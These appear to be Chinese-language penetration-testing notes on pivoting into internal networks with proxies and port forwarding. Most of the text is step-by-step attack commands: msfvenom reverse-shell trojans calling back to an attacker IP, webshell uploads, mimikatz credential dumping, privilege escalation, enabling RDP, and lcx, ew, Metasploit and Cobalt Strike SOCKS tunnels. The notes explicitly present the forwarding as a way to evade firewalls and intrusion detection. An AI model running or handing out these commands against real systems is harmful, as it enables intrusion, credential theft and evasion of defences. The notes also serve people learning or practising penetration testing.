代理：
是一种代表客户端向服务器发起请求的服务器，客户端不直接访问目标服务器，而是通过代理服务器向目标服务器发起请求。代理服务器可以对请求进行一些处理，比如缓存、过滤、重写头等等。代理服务器通常位于客户端和服务器之间，客户端将请求发送到代理服务器，代理服务器再将请求发送到目标服务器，并将服务器返回的响应再传回到客户端。

隧道：
则是一种将数据流经过加密和封装后，通过一个已经建立好的通道进行传输的技术。隧道协议通常用于在不安全的网络上建立安全通道，比如在互联网上进行远程登录、文件传输等操作。隧道协议可以将任何协议封装，并在两端建立一个虚拟的通信通道，数据在通道内传输时，可以对数据进行加密和解密等处理。

代理和隧道都是网络通信中常用的技术，它们的主要区别在于工作原理和使用方式。代理主要是用来代替客户端向服务器发起请求，并可以对请求进行一些处理；而隧道则是将数据流进行加密和封装，建立一个虚拟的通信通道来进行传输。



代理根据连接的方式不同又分为正向连接和反向连接，连接的过程中又会用到端口转发。
正向连接：目标服务器A对外服务，具有自己的公网IP地址时，B可以直接使用脚本或者木马控制服务器A。
反向连接：目标服务器A无公网IP，B无法通过外网连接到目标，需要让目标服务器A反向连接B从而实现控制。
端口转发：将一个端口上收到的数据流量转发给另一个端口。


在实际的工作中，正向连接往往会受到防火墙或者防护设备的限制，反向连接则完全没有这些影响。其次内网部署的各种防火墙和入侵检测设备会检查一些敏感端口的连接情况，如果发现连接存在异常就会立即阻断通信。通过端口转发将一些敏感端口的数据转发到不被防火墙监控的端口上，就可以绕过防火墙的检测！


==代理就是A和C之间网络不通，但是A和B能够通信，B和C能够通信，于是A利用B做跳板机去实现和C之间通信；==
==隧道主要是解决不出网协议上线的问题，也就是当A和C双方的网络通信被防火墙或者防护平台限制的时候，利用隧道技术来实现通信。==


==**一、LCX代理转发**==

1，利用MSF生成木马
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.9 lport=4444 -f exe >su.exe

2，msf进入监听模式
输入命令设置本地监听，具体命令如下：
启动msf：msfconsole
选择工具：use exploit/multi/handler
设置攻击语句：set payload windows/meterpreter/reverse_tcp
设置监听IP（注意IP地址是本地kali机器的IP地址）：set lhost 10.0.0.9
设置监听端口：set lport 4444
开始监听：run或者exploit


蚁剑上传木马，然后终端运行，MSF上线之后，就可以调用MSF强大的功能模块去做渗透了。



5，信息收集

MSF上线之后，就可以调用MSF强大的功能模块去做渗透了

调用mimikatz模块：load mimikatz

收集账号密码：creds_all

查看当前目标机器IP地址：ipconfig

需要提升为system权限：getsystem #windows2003以本地管理员登录可以成功


chcp 65001


6，上传转发工具lcx.exe，以便于端口转发

7，开启3389远程桌面
run getgui -e #这条命令在老版本的kali中可以正常运行，新版kali的MSF模块进行了更名
run post/windows/manage/enable_rdp #新版kali中运行这条命令即可 

8，MSF进入shell命令行，执行命令，将目标机器的3389端口转发到攻击机的IP地址和自定义端口上

shell ##可输入lcx.exe直接查看该工具的参数用法
lcx.exe -slave 192.168.2.4 5555 127.0.0.1 3389


9，本地攻击机执行命令实行端口二次转发（lcx工具的规定用法）
lcx.exe -listen 5555 1234
10，攻击机打开远程桌面连接，直接连接本机的1234端口

此时我们远程连接目标服务器过程中，因为是将目标的3389端口的流量做了转发，所以可以避免被防护设备监听到流量异常，能让渗透测试更加隐秘和安全。



==**二，ew代理转发**==

1，webshell上传ew.exe（蚁剑为例）
ew.exe是另一个端口转发的工具。给大家配备了相应的linux和MAC版本


2，MSF生成监听木马，上传到目标服务器，蚁剑进入虚拟终端命令行调用木马，MSF监听上线
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.201 lport=4444 -f exe >su.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.0.201
set lport 4444
exploit或者run


3，MSF提权进入shell命令行
getsystem
shell


4，将ew的Linux版本上传到kali攻击机

5，开启另一个kali窗口，执行命令
./ew_for_linux -s rcsocks -l 1008 -e 3389 #开启linux服务器版本的ew，将kali机器的1008端口流量转发到3389端口（端口可自定义）

6，shell命令行界面执行命令调用ew.exe，连接kali攻击机的ew服务器端口
ew.exe -s rssocks -d 192.168.163.133 -e 3389
代理建立成功！

7，打开Proxifier代理工具
Proxifier代理工具安装：https://blog.csdn.net/m0_52985087/article/details/134401391


8，设置代理服务器
添加输入kali攻击机的IP地址和端口，选择socks版本，点击确定
检查代理连接情况：绿色表示可运行

9，代理成功，内网已经穿透，可以直接使用本机访问内网服务:http://192.168.3.31/
同样的网址，配置内网代理之后，可以直接通过浏览器访问内网服务了。



==**三、使用MSF直接调用模块开启端口转发代理**==

代理设置步骤：

1、使用MSF生成木马（实战情况下需要做免杀处理）

2、通过webshell管理工具（菜刀、蚁剑、哥斯拉等等）上传到目标服务器。
启动木马

3、MSF会话上线之后，使用命令添加路由：
run autoroute -p  #查看路由
run post/multi/manage/autoroute   #添加路由
此时添加的路由是针对当前会话的路由，其他的程序和工具是没办法通过当前路由访问内网的，所以此时我们还需要添加相应的通信节点！

4、将当前会话放置到后台，调用相应的模块添加节点
background #将会话放置后台
search socks #搜索相应的会话模块
#添加节点的模块名为：auxiliary/server/socks_proxy

5、选择相应的模块，设置节点（可设置账号密码或者自定义端口）
use auxiliary/server/socks_proxy #选择相应的模块

6、设置Proxifier代理工具
![[1729086796414 1.png]]
7、代理成功之后，可直接在本地浏览器访问目标主机内网



==**四、CS的代理转发通信**==

代理设置步骤：

1，使用CS生成木马，通过webshell管理工具（菜刀、蚁剑、冰蝎、哥斯拉等）上传到Windows2003运行上线


2，CS选择“代理转发”点击“socks 代理”；
设置代理端口“自定义”，点击确定
![[Pasted image 20241016221413.png]]





3，打开Proxifier代理工具，新增代理服务器，填写IP地址(cs服务端IP)和自定义的端口检查测试代理的连接情况
![[1729088632084.jpg]]


4，代理之后，可直接访问内网网站
注意：Proxifier中选择的代理协议要和CS的代理协议一致！

==============================================================================================================================
